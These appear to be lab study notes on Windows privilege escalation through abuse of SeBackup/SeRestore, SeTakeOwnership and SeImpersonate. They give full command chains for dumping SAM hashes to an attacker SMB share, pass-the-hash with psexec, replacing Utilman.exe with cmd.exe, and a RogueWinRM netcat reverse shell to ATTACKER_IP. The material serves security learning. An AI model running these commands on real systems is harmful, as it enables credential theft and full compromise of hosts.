### Windows Privileges

A **Windows privilege** is a right assigned to an account/process to perform a specific system action.

Examples:
- `SeBackupPrivilege` → read files for backup, bypassing normal DACL checks.
- `SeRestorePrivilege` → write/restore files, bypassing normal DACL checks.
- `SeTakeOwnershipPrivilege` → take ownership of files/objects.
- `SeImpersonatePrivilege` → impersonate another user's security token.
- `SeAssignPrimaryTokenPrivilege` → assign another user's token to a process.

**PrivEsc idea:**
```text
Special privilege
      ↓
Abuse privilege
      ↓
Access protected object / impersonate privileged token
      ↓
SYSTEM
```

---

#  Enumerate User Privileges

```cmd
whoami /priv
```
→ Displays privileges assigned to the current account/process.
→ Open the cmd with administration to see more

Look specifically for potentially exploitable privileges such as:
```text
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

⚠️ A privilege can appear as `Disabled` but may still be usable when the process has the privilege assigned to it; the exact exploit depends on how the privilege is enabled/used.

---

# 1. SeBackupPrivilege + SeRestorePrivilege

### What are they?

`SeBackupPrivilege` and `SeRestorePrivilege` are intended for backup operators.

They can allow:
```text
SeBackupPrivilege  → Read protected files
SeRestorePrivilege → Write/restore protected files
```

while bypassing normal **DACL** restrictions.

**DACL** = permissions that determine who can access an object.

### PrivEsc Scenario
```text
Backup privilege
      ↓
Read SAM + SYSTEM registry hives
      ↓
Extract local password hashes
      ↓
Obtain Administrator NTLM hash
      ↓
Pass-the-Hash
      ↓
SYSTEM shell
```

### Check privileges
```cmd
whoami /priv
```

Look for:
```text
SeBackupPrivilege
SeRestorePrivilege
```

### Save SYSTEM hive
```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
```
→ Saves the Windows `SYSTEM` registry hive to a file.

The SYSTEM hive contains information needed to derive the system's **boot key**, which is required to decrypt/extract SAM password hashes.

### Save SAM hive
```cmd
reg save hklm\sam C:\Users\THMBackup\sam.hive
```
→ Saves the **SAM** database containing local account password hashes.


### Transfer hives to attacker

Create a directory:
```bash
mkdir share
```
→ Directory used as the SMB share.

Start Impacket SMB server:
```bash
python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```
→ Creates an SMB share named `public` pointing to the local `share` directory.

### Copy files from Windows to attacker

```cmd
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
```
→ Copies SAM hive to the attacker's SMB share.

```cmd
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```
→ Copies SYSTEM hive to the attacker's SMB share.

### Extract hashes

On attacker:
```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```
→ Extracts local SAM password hashes using the SYSTEM hive.

Example:
```text
Administrator:500:LM_HASH:NTLM_HASH:::
```
The important value is the **NTLM hash**.

### Pass-the-Hash
```bash
python /opt/impacket/examples/psexec.py -hashes LM_HASH:NTLM_HASH administrator@MACHINE_IP
```

Example:
```bash
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
```
→ Authenticates as Administrator using the NTLM hash instead of the plaintext password.

`psexec.py` typically uploads and starts a service remotely, resulting in a SYSTEM shell when the account has the required administrative access.

Verify:
```cmd
whoami
```

Expected:
```text
nt authority\system
```

### Attack Chain
```text
SeBackup + SeRestore
        ↓
reg save SAM + SYSTEM
        ↓
secretsdump.py
        ↓
Administrator NTLM hash
        ↓
psexec.py -hashes
        ↓
SYSTEM
```

**Key idea:** `SeBackupPrivilege → dump SAM/SYSTEM → crack/use NTLM hash → Pass-the-Hash`

---

# 2. SeTakeOwnershipPrivilege

### What is it?

`SeTakeOwnershipPrivilege` allows a user to take ownership of objects such as:
- Files
- Directories
- Registry keys

Taking ownership **doesn't automatically give full access**.
However, as the owner, you can modify the object's permissions and grant yourself access.

### PrivEsc Scenario
```text
SeTakeOwnershipPrivilege
        ↓
Take ownership of privileged file
        ↓
Grant yourself Full Control
        ↓
Replace privileged executable
        ↓
SYSTEM executes it
        ↓
SYSTEM shell
```

### Check privilege
```cmd
whoami /priv
```
administrative cmd 

Look for:
```text
SeTakeOwnershipPrivilege
```

## Example: Utilman Abuse

`utilman.exe` is the Windows **Ease of Access** program available from the login/lock screen.

The important property for this lab:
```text
utilman.exe → executed with SYSTEM privileges
```
If we replace it with `cmd.exe`, triggering Ease of Access can launch a SYSTEM command prompt.

### Take ownership
```cmd
takeown /f C:\Windows\System32\Utilman.exe
```
→ Makes the current user the owner of `Utilman.exe`.

### Grant yourself full control
```cmd
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```
→ Grants `THMTakeOwnership` full control over the file.
`F` = Full Control.

### Replace Utilman
```cmd
cd C:\Windows\System32\
```
→ Enter the System32 directory.

```cmd
copy cmd.exe utilman.exe
```
→ Replaces `utilman.exe` with a copy of `cmd.exe`.

### Trigger the payload

Lock the Windows session and select:
```text
Ease of Access
```
→ Windows launches the replaced `utilman.exe` as SYSTEM.

The resulting command prompt runs with SYSTEM privileges.

Verify:
```cmd
whoami
```

Expected:
```text
nt authority\system
```

### Attack Chain
```text
SeTakeOwnershipPrivilege
        ↓
takeown Utilman.exe
        ↓
icacls → Full Control
        ↓
Replace Utilman.exe with cmd.exe
        ↓
Lock screen
        ↓
Ease of Access
        ↓
cmd.exe runs as SYSTEM
```

**Key idea:** `Take ownership → grant access → replace privileged binary → trigger it as SYSTEM`

---

# 3. SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

### What are they?

These privileges allow a process to **impersonate another user's security token**.

A **security token** represents the identity and privileges of a Windows process/user.

If an attacker controls a process with these privileges and can make a privileged account authenticate to it, the attacker may be able to execute actions as that privileged account.

Common accounts that may have these privileges:
```text
LOCAL SERVICE
NETWORK SERVICE
IIS APPPOOL\DefaultAppPool
```

## PrivEsc Requirements

Usually need:
```text
1. Control a process with SeImpersonate/SeAssignPrimaryToken
2. Get a privileged process/account to authenticate/connect
3. Capture/impersonate its token
4. Execute code as that account
```

---
# 4. RogueWinRM

### Concept

Windows **BITS** (Background Intelligent Transfer Service) can make a connection to WinRM on:
```text
5985
```

If the legitimate WinRM service isn't running, RogueWinRM can start a fake service on port `5985` and receive the connection.

Because BITS runs with SYSTEM privileges, its authentication can be abused when the compromised process has `SeImpersonatePrivilege`.

Attack:
```text
Compromise IIS/web shell
        ↓
SeImpersonatePrivilege
        ↓
Start RogueWinRM
        ↓
BITS connects as SYSTEM
        ↓
Impersonate SYSTEM token
        ↓
Execute nc64.exe
        ↓
SYSTEM reverse shell
```

### Check privileges

From the compromised web shell:
```cmd
whoami /priv
```
in administrative cmd

Look for:
```text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

### Start listener

On attacker:
```bash
nc -lvp 4442
```
→ Waits for the reverse shell.

### Run RogueWinRM

From the compromised Windows shell:
```cmd
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

Parameters:
```text
-p
```

→ Program to execute after successful impersonation.
```text
-a
```
→ Arguments passed to that program.

Here:
```text
nc64.exe
```

receives:
```text
-e cmd.exe ATTACKER_IP 4442
```
→ Starts `cmd.exe` and connects it back to the attacker.
### Result
The attacker receives:
```cmd
whoami
```

Expected:
```text
nt authority\system
```

 The exploit may take up to around **2 minutes**  because of the BITS service behavior.

---

# Quick Privilege Escalation Checklist

```cmd
whoami /priv
```

Check for:

```text
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

### SeBackup / SeRestore

```text
reg save SAM
reg save SYSTEM
        ↓
secretsdump.py
        ↓
NTLM hash
        ↓
psexec.py -hashes
```

### SeTakeOwnership

```text
takeown
   ↓
icacls /grant
   ↓
replace privileged file
   ↓
trigger
   ↓
SYSTEM
```

### SeImpersonate / SeAssignPrimaryToken

```text
Compromised privileged process
        ↓
Force SYSTEM authentication
        ↓
Token impersonation
        ↓
RogueWinRM / similar technique
        ↓
SYSTEM
```

### Most important rule

> **When enumerating Windows PrivEsc, always run `whoami /priv`. A seemingly low-privileged account may have a powerful Windows privilege that provides a direct escalation path.**

